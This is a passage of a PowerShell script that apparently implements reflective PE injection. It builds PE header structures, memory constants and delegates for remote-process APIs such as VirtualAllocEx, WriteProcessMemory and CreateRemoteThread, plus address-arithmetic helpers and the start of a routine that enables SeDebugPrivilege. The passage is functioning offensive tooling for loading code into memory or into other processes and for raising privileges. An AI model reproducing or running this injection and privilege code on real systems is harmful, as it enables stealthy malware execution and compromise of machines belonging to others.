        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

        #Struct IMAGE_SECTION_HEADER
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

        $nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
        $ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
        $AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
        $nameField.SetCustomAttribute($AttribBuilder)

        $TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

        #Struct IMAGE_BASE_RELOCATION
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
        $IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

        #Struct IMAGE_IMPORT_DESCRIPTOR
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
        $IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

        #Struct IMAGE_EXPORT_DIRECTORY
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
        $TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
        $TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
        $IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY

        #Struct LUID
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
        $TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
        $LUID = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID

        #Struct LUID_AND_ATTRIBUTES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
        $TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
        $TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
        $LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES

        #Struct TOKEN_PRIVILEGES
        $Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
        $TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
        $TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
        $TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
        $TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
        $Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

        return $Win32Types
    }

    Function Get-Win32Constants
    {
        $Win32Constants = New-Object System.Object

        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
        $Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
        $Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
        $Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
        $Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
        $Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
        $Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0

        return $Win32Constants
    }

    Function Get-Win32Functions
    {
        $Win32Functions = New-Object System.Object

        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAlloc -Value $VirtualAlloc

        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualAllocEx -Value $VirtualAllocEx

        $memcpyAddr = Get-ProcAddress msvcrt.dll memcpy
        $memcpyDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
        $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memcpyAddr, $memcpyDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memcpy -Value $memcpy

        $memsetAddr = Get-ProcAddress msvcrt.dll memset
        $memsetDelegate = Get-DelegateType @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
        $memset = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memsetAddr, $memsetDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name memset -Value $memset

        $LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
        $LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
        $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr, $LoadLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $LoadLibrary

        $GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
        $GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
        $GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr, $GetProcAddressDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $GetProcAddress

        $GetProcAddressIntPtrAddr = Get-ProcAddress kernel32.dll GetProcAddress #This is still GetProcAddress, but instead of PowerShell converting the string to a pointer, you must do it yourself
        $GetProcAddressIntPtrDelegate = Get-DelegateType @([IntPtr], [IntPtr]) ([IntPtr])
        $GetProcAddressIntPtr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressIntPtrAddr, $GetProcAddressIntPtrDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetProcAddressIntPtr -Value $GetProcAddressIntPtr

        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFree -Value $VirtualFree

        $VirtualFreeExAddr = Get-ProcAddress kernel32.dll VirtualFreeEx
        $VirtualFreeExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
        $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeExAddr, $VirtualFreeExDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualFreeEx -Value $VirtualFreeEx

        $VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
        $VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr, $VirtualProtectDelegate)
        $Win32Functions | Add-Member NoteProperty -Name VirtualProtect -Value $VirtualProtect

        $GetModuleHandleAddr = Get-ProcAddress kernel32.dll GetModuleHandleA
        $GetModuleHandleDelegate = Get-DelegateType @([String]) ([IntPtr])
        $GetModuleHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetModuleHandleAddr, $GetModuleHandleDelegate)
        $Win32Functions | Add-Member NoteProperty -Name GetModuleHandle -Value $GetModuleHandle

        $FreeLibraryAddr = Get-ProcAddress kernel32.dll FreeLibrary
        $FreeLibraryDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FreeLibraryAddr, $FreeLibraryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $FreeLibrary

        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $OpenProcess

        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [UInt32]) ([UInt32])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $WaitForSingleObject

        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $WriteProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $WriteProcessMemory

        $ReadProcessMemoryAddr = Get-ProcAddress kernel32.dll ReadProcessMemory
        $ReadProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $ReadProcessMemory = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ReadProcessMemoryAddr, $ReadProcessMemoryDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $ReadProcessMemory

        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $CreateRemoteThread

        $GetExitCodeThreadAddr = Get-ProcAddress kernel32.dll GetExitCodeThread
        $GetExitCodeThreadDelegate = Get-DelegateType @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $GetExitCodeThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetExitCodeThreadAddr, $GetExitCodeThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $GetExitCodeThread

        $OpenThreadTokenAddr = Get-ProcAddress Advapi32.dll OpenThreadToken
        $OpenThreadTokenDelegate = Get-DelegateType @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $OpenThreadToken = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenThreadTokenAddr, $OpenThreadTokenDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $OpenThreadToken

        $GetCurrentThreadAddr = Get-ProcAddress kernel32.dll GetCurrentThread
        $GetCurrentThreadDelegate = Get-DelegateType @() ([IntPtr])
        $GetCurrentThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetCurrentThreadAddr, $GetCurrentThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $GetCurrentThread

        $AdjustTokenPrivilegesAddr = Get-ProcAddress Advapi32.dll AdjustTokenPrivileges
        $AdjustTokenPrivilegesDelegate = Get-DelegateType @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $AdjustTokenPrivileges = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AdjustTokenPrivilegesAddr, $AdjustTokenPrivilegesDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $AdjustTokenPrivileges

        $LookupPrivilegeValueAddr = Get-ProcAddress Advapi32.dll LookupPrivilegeValueA
        $LookupPrivilegeValueDelegate = Get-DelegateType @([String], [String], [IntPtr]) ([Bool])
        $LookupPrivilegeValue = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LookupPrivilegeValueAddr, $LookupPrivilegeValueDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $LookupPrivilegeValue

        $ImpersonateSelfAddr = Get-ProcAddress Advapi32.dll ImpersonateSelf
        $ImpersonateSelfDelegate = Get-DelegateType @([Int32]) ([Bool])
        $ImpersonateSelf = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateSelfAddr, $ImpersonateSelfDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $ImpersonateSelf

        # NtCreateThreadEx is only ever called on Vista and Win7. NtCreateThreadEx is not exported by ntdll.dll in Windows XP
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
            $NtCreateThreadExAddr = Get-ProcAddress NtDll.dll NtCreateThreadEx
            $NtCreateThreadExDelegate = Get-DelegateType @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $NtCreateThreadEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NtCreateThreadExAddr, $NtCreateThreadExDelegate)
            $Win32Functions | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $NtCreateThreadEx
        }

        $IsWow64ProcessAddr = Get-ProcAddress Kernel32.dll IsWow64Process
        $IsWow64ProcessDelegate = Get-DelegateType @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $IsWow64Process = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IsWow64ProcessAddr, $IsWow64ProcessDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $IsWow64Process

        $CreateThreadAddr = Get-ProcAddress Kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $Win32Functions | Add-Member -MemberType NoteProperty -Name CreateThread -Value $CreateThread

        return $Win32Functions
    }
    #####################################


    #####################################
    ###########    HELPERS   ############
    #####################################

    #Powershell only does signed arithmetic, so if we want to calculate memory addresses we have to use this function
    #This will add signed integers as if they were unsigned integers so we can accurately calculate memory addresses
    Function Sub-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )

        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                $Val = $Value1Bytes[$i] - $CarryOver
                #Sub bytes
                if ($Val -lt $Value2Bytes[$i])
                {
                    $Val += 256
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }

                [UInt16]$Sum = $Val - $Value2Bytes[$i]

                $FinalBytes[$i] = $Sum -band 0x00FF
            }
        }
        else
        {
            Throw "Cannot subtract bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64($FinalBytes, 0)
    }

    Function Add-SignedIntAsUnsigned
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )

        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)
        [Byte[]]$FinalBytes = [BitConverter]::GetBytes([UInt64]0)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            $CarryOver = 0
            for ($i = 0; $i -lt $Value1Bytes.Count; $i++)
            {
                #Add bytes
                [UInt16]$Sum = $Value1Bytes[$i] + $Value2Bytes[$i] + $CarryOver

                $FinalBytes[$i] = $Sum -band 0x00FF

                if (($Sum -band 0xFF00) -eq 0x100)
                {
                    $CarryOver = 1
                }
                else
                {
                    $CarryOver = 0
                }
            }
        }
        else
        {
            Throw "Cannot add bytearrays of different sizes"
        }

        return [BitConverter]::ToInt64($FinalBytes, 0)
    }

    Function Compare-Val1GreaterThanVal2AsUInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Int64]
        $Value1,

        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $Value2
        )

        [Byte[]]$Value1Bytes = [BitConverter]::GetBytes($Value1)
        [Byte[]]$Value2Bytes = [BitConverter]::GetBytes($Value2)

        if ($Value1Bytes.Count -eq $Value2Bytes.Count)
        {
            for ($i = $Value1Bytes.Count-1; $i -ge 0; $i--)
            {
                if ($Value1Bytes[$i] -gt $Value2Bytes[$i])
                {
                    return $true
                }
                elseif ($Value1Bytes[$i] -lt $Value2Bytes[$i])
                {
                    return $false
                }
            }
        }
        else
        {
            Throw "Cannot compare byte arrays of different size"
        }

        return $false
    }


    Function Convert-UIntToInt
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt64]
        $Value
        )

        [Byte[]]$ValueBytes = [BitConverter]::GetBytes($Value)
        return ([BitConverter]::ToInt64($ValueBytes, 0))
    }


    Function Get-Hex
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        $Value #We will determine the type dynamically
        )

        $ValueSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Value.GetType()) * 2
        $Hex = "0x{0:X$($ValueSize)}" -f [Int64]$Value #Passing a IntPtr to this doesn't work well. Cast to Int64 first.

        return $Hex
    }

    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $DebugString,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 2, Mandatory = $true)]
        [IntPtr]
        $StartAddress,

        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
        [IntPtr]
        $Size
        )

        [IntPtr]$FinalEndAddress = [IntPtr](Add-SignedIntAsUnsigned ($StartAddress) ($Size))

        $PEEndAddress = $PEInfo.EndAddress

        if ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt ($FinalEndAddress) ($PEEndAddress)) -eq $true)
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }

    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = $true)]
            [Byte[]]
            $Bytes,

            [Parameter(Position=1, Mandatory = $true)]
            [IntPtr]
            $MemoryAddress
        )

        for ($Offset = 0; $Offset -lt $Bytes.Length; $Offset++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte($MemoryAddress, $Offset, $Bytes[$Offset])
        }
    }

    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]

            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),

            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')

        Write-Output $TypeBuilder.CreateType()
    }


    #Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]

            [Parameter( Position = 0, Mandatory = $True )]
            [String]
            $Module,

            [Parameter( Position = 1, Mandatory = $True )]
            [String]
            $Procedure
        )

        # Get a reference to System.dll in the GAC
        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')

        # Get a reference to the GetModuleHandle and GetProcAddress methods
        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
        $GetProcAddress = $UnsafeNativeMethods.GetMethods() | Where {$_.Name -eq "GetProcAddress"} | Select-Object -first 1

        # Get a handle to the module specified
        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))

        # Return the address of the function
        try
        {
            $tmpPtr = New-Object IntPtr
            $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
            Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
        }
        catch
        {
            # Windows 10 v1803 needs $Kern32Handle as a System.IntPtr instead of System.Runtime.InteropServices.HandleRef
            Write-Output $GetProcAddress.Invoke($null, @($Kern32Handle, $Procedure))
        }
    }

    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [IntPtr]$ThreadHandle = $Win32Functions.GetCurrentThread.Invoke()
        if ($ThreadHandle -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }

        [IntPtr]$ThreadToken = [IntPtr]::Zero
        [Bool]$Result = $Win32Functions.OpenThreadToken.Invoke($ThreadHandle, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$ThreadToken)
        if ($Result -eq $false)
        {
            $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
